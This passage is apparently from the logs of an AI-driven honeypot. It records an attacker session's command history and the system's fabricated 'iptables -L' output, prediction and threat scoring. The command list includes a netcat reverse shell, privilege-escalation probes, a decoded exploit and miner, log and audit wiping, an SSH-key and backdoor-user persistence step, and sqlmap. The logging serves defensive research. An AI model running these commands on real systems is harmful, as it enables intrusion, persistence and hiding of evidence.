            "./tmp/miner",
            "base64 -d exploit.b64 > exploit",
            "find / -perm -4000 -type f 2>/dev/null",
            "pkexec --version",
            "dirtycow",
            "sudo -l",
            "chmod +x payload.sh",
            "chmod 777 /var/www/html/uploads",
            "nc -lvp 4444",
            "netcat -e /bin/bash 10.0.0.5 8080",
            "telnet 10.0.0.1 23",
            "ssh user@10.0.0.1",
            "ftp 10.0.0.1",
            "history -c",
            "rm -rf /var/log/nginx",
            "stop auditd",
            "echo \"ssh-rsa AAAAB...\" >> ~/.ssh/authorized_keys",
            "useradd -m -g root backdoor",
            "crontab -e",
            "sqlmap -u \"http://site.com/index.php?id=1\" --dbs",
            "date",
            "env",
            "printenv",
            "echo \"hello world\"",
            "which python3",
            "which gcc",
            "docker ps",
            "iptables -L"
        ],
        "confidence_score": 0.99
    }
}
2026-07-21 11:22:26,276 - {"session_id": "71dd20b2", "command": "iptables -L", "attack_type": "Unknown", "risk_score": 192, "threat_level": "CRITICAL"}
2026-07-21 11:22:26,277 - {
    "session_id": "71dd20b2",
    "command": "iptables -L",
    "ai_decision": "Chain INPUT (policy ACCEPT)\ntarget     prot opt source               destination         \n\nChain FORWARD (policy ACCEPT)\ntarget     prot opt source               destination         \n\nChain OUTPUT (policy ACCEPT)\ntarget     prot opt source               destination",
    "confidence_score": 0.5,
    "conversation_metadata": {
        "conversation_id": "71dd20b2",
        "interaction_count": 81
    },
    "prediction_result": {
        "next_prediction": "Privilege Escalation",
        "prediction_confidence": 0.5
    },
    "risk_score": 192,
    "threat_level": "CRITICAL"
}
2026-07-21 11:22:26,277 - {
    "session_id": "71dd20b2",
    "conversation_log": "Attacker executed: iptables -L",
    "ai_decision": "Chain INPUT (policy ACCEPT)\ntarget     prot opt source               destination         \n\nChain FORWARD (policy ACCEPT)\ntarget     prot opt source               destination         \n\nChain OUTPUT (policy ACCEPT)\ntarget     prot opt source               destination",
    "session_metadata": {
        "prediction": "Privilege Escalation"
    },
    "system_event": "AI Deception Generated",
    "security_event": "Unknown",
    "warning": "High Threat Level",
    "error": null
}
